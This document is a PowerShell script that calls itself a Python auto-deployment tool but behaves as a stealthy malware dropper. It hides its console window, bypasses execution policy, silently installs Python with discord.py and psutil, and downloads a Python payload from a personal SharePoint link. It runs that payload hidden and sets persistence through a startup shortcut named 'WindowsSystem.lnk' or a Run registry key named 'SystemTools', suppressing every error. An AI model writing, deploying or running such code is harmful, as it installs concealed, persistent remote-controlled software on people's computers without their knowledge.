<# 
.SYNOPSIS
    Python Auto-Deployment Script
.DESCRIPTION 
    Installs Python and runs a script automatically
#>

# Bypass execution policy silently
try { Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue } catch {}

# Hide window immediately using simpler method
try {
    $api = Add-Type -Name "WinApi" -MemberDefinition @"
[DllImport("user32.dll")]
public static extern bool ShowWindow(System.IntPtr hWnd, int nCmdShow);
[DllImport("kernel32.dll")]
public static extern System.IntPtr GetConsoleWindow();
"@ -PassThru
    $hwnd = $api::GetConsoleWindow()
    $api::ShowWindow($hwnd, 0)  # 0 = hide
} catch {}

# Function to check Python
function Test-PythonInstalled {
    try {
        $null = & { python --version 2>$null }
        return $true
    } catch { }
    
    try {
        $null = & { python3 --version 2>$null }  
        return $true
    } catch { }
    
    return $false
}

# Function to install Python
function Install-PythonSilently {
    try {
        $url = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
        $path = "$env:TEMP\python-setup.exe"
        
        # Download
        (New-Object Net.WebClient).DownloadFile($url, $path)
        
        # Install silently
        $proc = Start-Process -FilePath $path -ArgumentList @(
            "/quiet", "InstallAllUsers=0", "PrependPath=1", 
            "Include_test=0", "Include_pip=1", "Include_launcher=0"
        ) -Wait -PassThru -WindowStyle Hidden
        
        if ($proc.ExitCode -eq 0) {
            Start-Sleep -Seconds 8
            return $true
        }
    } catch { }
    return $false
}

# Function to install packages
function Install-PythonPackages {
    $packages = "discord.py", "psutil"
    foreach ($pkg in $packages) {
        try {
            Start-Process -FilePath "python" -ArgumentList "-m", "pip", "install", $pkg, "--quiet", "--user" -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
        } catch { }
    }
}

# Function to setup startup
function Setup-StartupPersistence {
    $scriptPath = "$env:USERPROFILE\ProcessManager.py"
    
    # Method 1: Startup folder
    try {
        $startup = [Environment]::GetFolderPath("Startup")
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut("$startup\WindowsSystem.lnk")
        $shortcut.TargetPath = "python"
        $shortcut.Arguments = "`"$scriptPath`""
        $shortcut.WindowStyle = 7
        $shortcut.WorkingDirectory = "$env:USERPROFILE"
        $shortcut.Save()
        return $true
    } catch { }
    
    # Method 2: Registry
    try {
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemTools" -Value "python `"$scriptPath`"" -PropertyType String -Force -ErrorAction SilentlyContinue
        return $true
    } catch { }
    
    return $false
}

# Main execution
try {
    # Check and install Python if needed
    if (-not (Test-PythonInstalled)) {
        if (Install-PythonSilently) {
            Start-Sleep -Seconds 3
        }
    }
    
    # Install packages
    Install-PythonPackages
    
    # Download main script
    $url = "https://trioworldacademy1-my.sharepoint.com/:u:/g/personal/namanreddykaliki_trioworldacademy_com/ET8GO_7FfCdImpWbGYD-zREB9WkwjG6K5Zoo9dn0xghp9g?e=PanmFy&download=1"
    $path = "$env:USERPROFILE\ProcessManager.py"
    
    try {
        (New-Object Net.WebClient).DownloadFile($url, $path)
    } catch {
        try {
            Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -ErrorAction SilentlyContinue
        } catch { }
    }
    
    # Run script and setup startup
    if (Test-Path $path) {
        Start-Process -FilePath "python" -ArgumentList "`"$path`"" -WindowStyle Hidden
        Setup-StartupPersistence
    }
} catch {
    # Silent failure
}

# Exit
Start-Sleep -Seconds 2
